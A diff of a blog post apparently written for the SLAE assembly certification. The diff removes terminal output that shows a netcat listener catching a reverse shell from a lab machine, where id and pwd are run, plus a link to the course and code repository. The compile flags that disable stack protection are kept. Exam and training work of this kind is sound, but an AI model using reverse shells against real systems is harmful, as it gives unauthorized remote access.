@@ -245,30 +245,3 @@ int main(void)
 
 Compile the shellcode.c program with `gcc -fno-stack-protector -z execstack -m32 shellcode.c -o egg_hunt` and ran `./egg_hunt`
 
-```terminal_session
-SLAE@ubuntu:~/SLAE/Exam$ ./rev_shell
-Shellcode Length:  99
-```
-
-```terminal_session
-root@astrid:~/petprojects# nc -lvp 1234
-listening on [any] 1234 ...
-192.168.1.192: inverse host lookup failed: Unknown host
-connect to [192.168.1.188] from (UNKNOWN) [192.168.1.192] 57324
-id
-uid=1000(SLAE) gid=1000(SLAE) groups=1000(SLAE),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
-pwd
-/home/SLAE/SLAE/Exam
-```
-
-It works!!
-
-## Github Repo 
-
-This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
-<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>
-
-Student ID: SLAE-1458
-
-You can find all of the code used in this blog post [here.](https://github.com/h0mbre/SLAE/tree/master/Assignment2)
-
